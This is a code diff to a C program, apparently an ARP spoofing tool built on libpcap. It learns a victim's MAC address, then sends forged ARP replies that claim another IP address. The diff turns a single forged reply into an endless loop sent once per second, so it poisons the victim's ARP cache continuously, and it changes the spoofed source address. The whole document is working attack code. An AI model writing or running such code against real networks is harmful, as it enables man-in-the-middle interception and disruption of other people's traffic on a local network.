@@ -6,6 +6,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 //const uint64_t BUF_LEN = 1024;
 //const uint64_t IP_STRING_BUF_LEN = 6;
@@ -64,7 +65,7 @@ int main(int argc, char * argv[])
 	struct ether_header * ether_packet;
 	struct ether_arp *arp_packet;
 	while(1) {
-		sendArpPacket(handle, local_mac_strbuf, "00:00:00:00:00:00", local_ip_strbuf, argv[2], ARPOP_REQUEST);
+		sendArpPacket(handle, local_mac_strbuf, "00:00:00:00:00:00", argv[3], argv[2], ARPOP_REQUEST);
 
 		res = pcap_next_ex(handle, &header, &packet);
 		if(res == 0)
@@ -97,7 +98,9 @@ int main(int argc, char * argv[])
 
 	fprintf(stdout, "[*] victim MAC addr\t: %s\n", victim_mac_buf);
 
-	sendArpPacket(handle, local_mac_strbuf, victim_mac_buf, argv[3], argv[2], ARPOP_REPLY);
+	fprintf(stdout, "[-] press 'ctrl + z' to exit\n");
+	while(1)
+		sendArpPacket(handle, local_mac_strbuf, victim_mac_buf, argv[3], argv[2], ARPOP_REPLY);
 
 
 	return 0;
@@ -197,8 +200,11 @@ void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dest_mac_buf, char *src_i
 
 	if(-1 == pcap_sendpacket(p, buf, ARP_PACKET_SIZE))
 		errorHandling("Error Occured In pcap_sendpacket");
-	else
+	else{
 		fprintf(stdout, "[*] sending arp request packet\n");
+		sleep(1);
+	}
+
 }
 
 void errorHandling(char * message)
